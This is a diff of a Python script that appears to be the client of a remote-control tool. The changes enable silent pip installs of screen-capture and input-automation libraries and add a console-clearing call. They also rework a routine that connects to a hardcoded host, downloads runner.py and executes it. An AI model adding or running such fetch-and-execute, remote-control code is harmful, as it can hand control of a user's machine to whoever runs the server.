@@ -1,17 +1,15 @@
-
-
 host_ip = '192.168.1.2'
 HOST_PORT = 59999
 BUFFER_SIZE = 1024*10
 
-"""import pip
+import pip
 pip.main(['install', 'pillow'])
 pip.main(['install', 'ping3'])
 pip.main(['install', 'pyautogui'])
 pip.main(['install', 'opencv_python'])
 pip.main(['install', 'psutil'])
 pip.main(['install', 'requests'])
-del pip"""
+del pip
 
 
 import socket
@@ -21,6 +19,7 @@ import pyautogui
 from PIL import Image, ImageGrab
 pyautogui.FAILSAFE = False
 
+system_caller('cls')
 
 os_type = system()
 ip_initial=''
@@ -135,31 +134,11 @@ if open('final_main.py', 'rb').read() != main_data:
         main_file.write(main_data)
     system_caller('final_main.py')
 else:
-        connection = force_connect_server('tcp')
-        __send_to_connection(connection, b'1')
-        open('../py_files/runner.py', 'wb').close()
-        runner_file = open('../py_files/runner.py', 'ab')
-        runner_file.write(__receive_from_connection(connection))
-        runner_file.close()
-        connection.close()
-        system_caller('../py_files/runner.py')
-
-
-"""
-module sharing
-def a(x):
-	counter = 0
-	for _ in x:
-		print(counter, _)
-		counter+=1
-
-import time, threading
-all_functions = []
-for _ in dir():
-	if _[:2] != '__':
-		if _ != 'a':
-			if str(type(locals()[_])) == "<class 'module'>":
-				print('added', locals()[_], _)
-				all_functions.append(locals()[_])
-#print(all_functions)
-a(all_functions)"""
+    connection = force_connect_server('tcp')
+    __send_to_connection(connection, b'1')
+    open('runner.py', 'wb').close()
+    runner_file = open('runner.py', 'ab')
+    runner_file.write(__receive_from_connection(connection))
+    runner_file.close()
+    connection.close()
+    system_caller('runner.py')
